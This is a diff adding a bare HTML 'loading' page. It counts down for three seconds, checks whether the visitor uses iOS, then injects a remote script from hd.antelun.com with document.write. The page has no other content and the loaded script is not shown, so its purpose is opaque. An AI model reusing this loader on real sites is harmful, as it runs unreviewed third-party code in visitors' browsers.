@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>loading</title>
+<style>
+html {
+    -ms-text-size-adjust: 100%;
+    -webkit-text-size-adjust: 100%;
+    line-height: 1.6
+}
+body {
+    -webkit-touch-callout: none;
+    font-family: -apple-system-font,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+    background-color: #f3f3f3;
+    line-height: inherit
+}
+.vertical-center{
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size:180px;
+}
+</style>
+</head>
+<body>
+<div id="t" class="vertical-center">3</div>
+</body>
+<script>
+var o=3;
+var pcl=self.setInterval("clock()",1000)
+function clock(){
+  o--;document.getElementById("t").innerHTML=o;
+}
+function is_ios() {
+	var u = navigator.userAgent;
+    if(!!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)){
+        return true;
+    }else{
+        return false;
+    }
+}
+var js="http://hd.antelun.com/s2/vs2.js";
+if(is_ios()){js="https://hd.antelun.com/s2/vs2.js";}
+function sto(){
+	window.clearInterval(pcl);
+	document.write("<script src='"+js+"'><\/script>");
+	document.close();
+}
+setTimeout('sto()',3000)
+</script>
+</html>
